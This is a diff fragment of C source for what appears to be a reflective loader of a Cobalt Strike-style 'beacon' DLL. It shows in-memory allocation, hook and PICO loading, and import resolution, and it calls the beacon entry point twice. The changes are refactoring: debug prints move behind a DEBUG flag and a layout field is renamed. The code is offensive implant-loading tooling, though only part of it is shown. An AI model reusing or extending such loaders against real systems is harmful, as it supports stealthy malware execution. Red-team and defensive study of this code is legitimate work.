@@ -67,16 +67,6 @@ typedef struct {
     WIN32_FUNC(CreateProcessA);
 } WIN32FUNCS;
 
-typedef struct {
-    #if DEBUG
-    char data[8192];
-    char code[16384];
-    #else
-    char data[4096];
-    char code[16384];
-    #endif
-} PICO;
-
 char __DRAUGR__[0] __attribute__((section("draugr")));
 char __HOOKS__[0]  __attribute__((section("hooks")));
 char __DLL__[0]    __attribute__((section("dll")));
@@ -183,10 +173,11 @@ void reflectiveLoader(WIN32FUNCS * funcs, MEMORY_LAYOUT * layout)
     /* Allocate memory for it */
     hookDst = (PICO *)allocateVirtualMemory(sizeof(PICO), PAGE_READWRITE);
 
-    dprintf("HOOK DST: 0x%p\n", hookDst);
-
-    dprintf("data size %d\n", PicoDataSize(hookSrc));
-    dprintf("code size %d\n", PicoCodeSize(hookSrc));
+    #if DEBUG
+    dprintf("hookDst      : 0x%p\n", hookDst);
+    dprintf("PicoDataSize : %d\n", PicoDataSize(hookSrc));
+    dprintf("PicoCodeSize : %d\n", PicoCodeSize(hookSrc));
+    #endif
 
     /* Load it into memory */
     PicoLoad((IMPORTFUNCS *)funcs, hookSrc, hookDst->code, hookDst->data);
@@ -225,11 +216,11 @@ void reflectiveLoader(WIN32FUNCS * funcs, MEMORY_LAYOUT * layout)
     LoadDLL(&beaconData, beaconSrc, beaconDst);
     ProcessImports((IMPORTFUNCS *)funcs, &beaconData, beaconDst);
 
-    layout->beacon.baseAddress = beaconDst;
-    layout->beacon.size        = SizeOfDLL(&beaconData);
+    layout->dll.baseAddress = beaconDst;
+    layout->dll.size        = SizeOfDLL(&beaconData);
 
     /* Fix section memory permissions */
-    fixSectionPermissions(&beaconData, beaconSrc, beaconDst, &layout->beacon);
+    fixSectionPermissions(&beaconData, beaconSrc, beaconDst, &layout->dll);
 
     /* Call hook entry point again to provide the updated memory layout */
     picoEntry((IMPORTFUNCS *)funcs, layout);
@@ -238,8 +229,8 @@ void reflectiveLoader(WIN32FUNCS * funcs, MEMORY_LAYOUT * layout)
     DLLMAIN_FUNC beaconEntry = EntryPoint(&beaconData, beaconDst);
 
     /* Call it twice */
-    beaconEntry((HINSTANCE)beaconDst,     DLL_PROCESS_ATTACH, NULL);
-    beaconEntry((HINSTANCE)loaderStart(), 0x4,                NULL);
+    beaconEntry((HINSTANCE)beaconDst, DLL_PROCESS_ATTACH, NULL);
+    beaconEntry((HINSTANCE)loaderStart(), 0x4, NULL);
 }
 
 void go()
@@ -282,8 +273,7 @@ void go()
     picDst = allocateVirtualMemory(picSrc->length, PAGE_READWRITE);
 
     #if DEBUG
-    PIC_STRING(dst, "PIC @ 0x%lp\n");
-    dprintf((IMPORTFUNCS *)&funcs, dst, picDst);
+    dprintf("picDst : 0x%p\n", picDst);
     #endif
 
     /* Copy it into memory */
